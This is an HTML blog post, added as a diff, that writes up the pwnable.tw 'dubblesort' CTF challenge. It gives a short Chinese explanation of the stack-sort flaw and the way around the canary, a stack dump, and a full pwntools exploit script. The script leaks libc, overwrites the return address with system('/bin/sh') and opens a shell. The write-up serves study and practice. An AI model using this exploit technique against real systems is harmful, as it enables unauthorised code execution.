@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Dubblesort Write Up"/>
+
+
+
+
+  <meta name="keywords" content="pwnable.tw,pwn,stack overflow,CTF, Znight" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Znight">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.5.0" />
+
+
+
+<link rel="canonical" href="http://znight.sight/2017/11/19/dubblesort-write-up/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.5.0" />
+
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+    <title> Dubblesort Write Up - Znight </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Znight</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags/">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Znight</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Dubblesort Write Up
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017-11-19
+        </span>
+        
+          <div class="post-category">
+            
+              <a href="/categories/write-up/">write-up</a>
+            
+          </div>
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack"><span class="toc-text">stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><ol>
+<li>由于程序未对需要冒泡排序的数字的个数进行限制, 这意味着我们可以对栈中的重要内容进行排序. 虽然程序开了<code>Full RELRO</code>, 但栈内数据的大小顺序是不会改变的.</li>
+<li>为了不改写<code>canary</code>的值, 我们只能写入0x20个值, 但是需要对0x2b个数据进行排序, 考虑到程序用了<code>scanf(&quot;%u&quot;, &amp;num)</code>来输入数据, 我们可以通过写入一个<code>a</code>(或者其他非数字符号)来达到目的.</li>
+<li>该exp中假设<code>0x56555b2b</code>&lt;<code>cannary</code>的值, 因为这样成功的几率会大一些</li>
+<li>将<code>system_addr</code>写入返回地址,将<code>binsh</code>写入第一个参数的位置.<a id="more"></a>
+</li>
+</ol>
+<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">               canary</div><div class="line">0xffffdafc:    0x8ec66400    0xf7fc33dc    0xffffdcdb    0x56555b2b</div><div class="line">0xffffdb0c:    0x00000000    0xf7fc3000    0xf7fc3000    0x00000000</div><div class="line">0xffffdb1c:    0xf7e29637    0x00000001    0xffffdbb4    0xffffdbbc</div><div class="line">0xffffdb2c:    0x00000000    0x00000000    0x00000000    0xf7fc3000</div><div class="line">0xffffdb3c:    0xf7ffdc04    0x00000001</div></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">system_offset = <span class="number">0x3a940</span> + <span class="number">0x460</span></div><div class="line">binsh_offset = system_offset + <span class="number">1182731</span></div><div class="line">log.info(<span class="string">"binsh_offset: 0x%x"</span> % (binsh_offset))</div><div class="line">log.info(<span class="string">"system_offset: 0x%x"</span> % (system_offset))</div><div class="line"></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line">context.log_level = <span class="string">'DEBUG'</span></div><div class="line">context.arch = <span class="string">'x86'</span></div><div class="line"></div><div class="line">io = process(<span class="string">'./dubblesort'</span>)</div><div class="line"><span class="comment"># gdb.attach(io, 'b *main+315')</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">24</span></div><div class="line">io.recvuntil(<span class="string">'What your name :'</span>)</div><div class="line">io.sendline(payload)</div><div class="line">io.recvuntil(<span class="string">'Hello '</span> + payload)</div><div class="line">libc_base = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x1b200a</span></div><div class="line">log.info(<span class="string">"get libc base addr : 0x%x"</span> % (libc_base))</div><div class="line"></div><div class="line">io.recvuntil(<span class="string">'How many numbers do you what to sort :'</span>)</div><div class="line">io.sendline(str(<span class="number">0x2b</span>))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">    io.recvuntil(<span class="string">'number : '</span>)</div><div class="line">    io.sendline(str(libc_base + system_offset))</div><div class="line">    i -= <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</div><div class="line">    io.recvuntil(<span class="string">'number : '</span>)</div><div class="line">    io.sendline(str(<span class="number">0</span>))</div><div class="line">    i -= <span class="number">1</span></div><div class="line">io.sendline(str(libc_base + binsh_offset))</div><div class="line">io.sendline(<span class="string">'a'</span>)</div><div class="line">io.recvuntil(<span class="string">'Result :\n'</span>)</div><div class="line">io.recv(<span class="number">57</span>)</div><div class="line">canary = int(io.recv(<span class="number">10</span>))</div><div class="line">log.info(<span class="string">"get canary: 0x%x"</span> % (canary))</div><div class="line">io.recv()</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/pwnable-tw-pwn-stack-overflow-CTF/">pwnable.tw,pwn,stack overflow,CTF</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/11/18/3-important-structure-in-glibc-malloc/">
+        <span class="next-text nav-default">3 Important Structure in Glibc Malloc</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:leeeric053@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://github.com/Leeericent" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+    
+    2017
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Lericent Lee</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+
+
+    
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.5.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.5.0"></script>
+
+  </body>
+</html>
